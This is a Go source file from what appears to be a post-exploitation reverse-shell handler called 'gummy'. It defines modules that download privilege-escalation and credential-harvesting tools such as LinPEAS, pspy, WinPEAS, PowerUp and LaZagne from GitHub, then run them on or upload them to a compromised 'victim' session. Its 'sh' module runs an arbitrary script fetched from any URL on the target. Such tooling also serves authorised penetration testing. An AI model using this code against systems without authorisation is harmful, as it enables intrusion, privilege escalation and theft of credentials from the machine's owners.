package internal

import (
	"context"
	"fmt"
	"sort"
)

// Module interface for all gummy modules
type Module interface {
	Name() string        // Module identifier (e.g., "peas", "lse", "sh")
	Category() string    // Category (e.g., "Linux", "Windows", "Misc", "Custom")
	Description() string // Short description
	Run(session *SessionInfo, args []string) error
}

// ModuleRegistry holds all registered modules
type ModuleRegistry struct {
	modules map[string]Module
}

var globalRegistry *ModuleRegistry

// GetModuleRegistry returns the global module registry (singleton)
func GetModuleRegistry() *ModuleRegistry {
	if globalRegistry == nil {
		globalRegistry = NewModuleRegistry()
		// Register built-in modules
		globalRegistry.Register(&PEASModule{})
		globalRegistry.Register(&LSEModule{})
		globalRegistry.Register(&PSPYModule{})
		globalRegistry.Register(&PrivescModule{})
		globalRegistry.Register(&ShellScriptModule{})
	}
	return globalRegistry
}

// NewModuleRegistry creates a new module registry
func NewModuleRegistry() *ModuleRegistry {
	return &ModuleRegistry{
		modules: make(map[string]Module),
	}
}

// Register adds a module to the registry
func (r *ModuleRegistry) Register(module Module) {
	r.modules[module.Name()] = module
}

// Get retrieves a module by name
func (r *ModuleRegistry) Get(name string) (Module, bool) {
	mod, exists := r.modules[name]
	return mod, exists
}

// List returns all registered modules sorted by name
func (r *ModuleRegistry) List() []Module {
	var mods []Module
	for _, mod := range r.modules {
		mods = append(mods, mod)
	}

	// Sort by name
	sort.Slice(mods, func(i, j int) bool {
		return mods[i].Name() < mods[j].Name()
	})

	return mods
}

// ListByCategory returns all modules grouped by category
func (r *ModuleRegistry) ListByCategory() map[string][]Module {
	categories := make(map[string][]Module)

	for _, mod := range r.modules {
		cat := mod.Category()
		categories[cat] = append(categories[cat], mod)
	}

	// Sort modules within each category
	for cat := range categories {
		sort.Slice(categories[cat], func(i, j int) bool {
			return categories[cat][i].Name() < categories[cat][j].Name()
		})
	}

	return categories
}

// ============================================================================
// Module URLs (from Penelope)
// ============================================================================

const (
	// Linux
	URL_LINPEAS = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
	URL_LSE     = "https://github.com/chsoares/linux-smart-enumeration/raw/refs/heads/master/lse.sh"
	URL_DEEPCE  = "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh"
	URL_PSPY64  = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
	URL_PSPY32  = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32"

	// Windows
	URL_WINPEAS      = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe"
	URL_POWERUP      = "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1"
	URL_PRIVESCCHECK = "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1"
	URL_LAZAGNE      = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe"
	URL_SHARPUP      = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe"
	URL_POWERVIEW    = "https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1"
)

// Script lists for privesc module
var linuxPrivescScripts = []string{
	URL_LINPEAS,
	URL_LSE,
	URL_DEEPCE,
}

var windowsPrivescScripts = []string{
	URL_WINPEAS,
	URL_POWERUP,
	URL_PRIVESCCHECK,
	URL_LAZAGNE,
	URL_SHARPUP,
	URL_POWERVIEW,
}

// ============================================================================
// Linux Modules
// ============================================================================

// PEASModule - LinPEAS privilege escalation scanner
type PEASModule struct{}

func (m *PEASModule) Name() string        { return "peas" }
func (m *PEASModule) Category() string    { return "linux" }
func (m *PEASModule) Description() string { return "Run LinPEAS privilege escalation scanner" }

func (m *PEASModule) Run(session *SessionInfo, args []string) error {
	return session.RunScript(URL_LINPEAS, args)
}

// LSEModule - Linux Smart Enumeration
type LSEModule struct{}

func (m *LSEModule) Name() string        { return "lse" }
func (m *LSEModule) Category() string    { return "linux" }
func (m *LSEModule) Description() string { return "Run Linux Smart Enumeration" }

func (m *LSEModule) Run(session *SessionInfo, args []string) error {
	// Default to -l1 if no args provided
	if len(args) == 0 {
		args = []string{"-l1"}
	}
	return session.RunScript(URL_LSE, args)
}

// PSPYModule - Monitor processes without root (pspy64)
type PSPYModule struct{}

func (m *PSPYModule) Name() string        { return "pspy" }
func (m *PSPYModule) Category() string    { return "linux" }
func (m *PSPYModule) Description() string { return "Run pspy process monitor" }

func (m *PSPYModule) Run(session *SessionInfo, args []string) error {
	// Default to pspy64, but could add detection for 32-bit systems
	return session.RunBinary(URL_PSPY64, args)
}

// ============================================================================
// Windows Modules
// ============================================================================

// (Future: WinPEAS, PowerUp, etc.)

// ============================================================================
// Misc Modules
// ============================================================================

// PrivescModule - Upload multiple privesc scripts at once
type PrivescModule struct{}

func (m *PrivescModule) Name() string        { return "privesc" }
func (m *PrivescModule) Category() string    { return "misc" }
func (m *PrivescModule) Description() string { return "Upload multiple privilege escalation scripts" }

func (m *PrivescModule) Run(session *SessionInfo, args []string) error {
	var scripts []string

	// Select scripts based on detected platform
	switch session.Platform {
	case "linux", "unix", "":
		scripts = linuxPrivescScripts
	case "windows":
		scripts = windowsPrivescScripts
	default:
		scripts = linuxPrivescScripts // Default to Linux
	}

	// Upload each script using Transferer (handles download + upload with nice output)
	for _, url := range scripts {
		filename := getFilenameFromURL(url)

		// Download locally to temp with unique name
		localPath := fmt.Sprintf("/tmp/gummy_%s", filename)
		if err := DownloadFile(url, localPath); err != nil {
			continue
		}

		// Upload to victim's CWD with original filename
		t := NewTransferer(session.Conn, session.ID)
		t.Upload(context.Background(), localPath, filename)
	}

	return nil
}

// Helper to extract filename from URL
func getFilenameFromURL(url string) string {
	// Simple extraction: get last part after /
	for i := len(url) - 1; i >= 0; i-- {
		if url[i] == '/' {
			return url[i+1:]
		}
	}
	return url
}

// ============================================================================
// Custom Modules
// ============================================================================

// ShellScriptModule - Run arbitrary shell script from URL
type ShellScriptModule struct{}

func (m *ShellScriptModule) Name() string        { return "sh" }
func (m *ShellScriptModule) Category() string    { return "custom" }
func (m *ShellScriptModule) Description() string { return "Run arbitrary shell script from URL" }

func (m *ShellScriptModule) Run(session *SessionInfo, args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("usage: run sh <url> [script args...]")
	}

	url := args[0]
	scriptArgs := args[1:]

	return session.RunScript(url, scriptArgs)
}
